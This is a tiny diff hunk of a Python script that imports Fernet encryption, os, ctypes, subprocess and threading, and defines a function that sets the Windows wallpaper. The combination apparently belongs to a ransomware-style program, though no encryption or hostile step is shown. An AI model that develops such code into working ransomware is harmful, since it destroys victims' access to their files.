@@ -1,7 +1,7 @@
 #Mi magna opera magistralis.
 
 from cryptography.fernet import Fernet
-import os , ctypes , requests 
+import os , ctypes , subprocess , threading 
 
 def set_wallpaper(img):
     ctypes.windll.user32.SystemParametersInfoW(20 , 0 , img , 0)
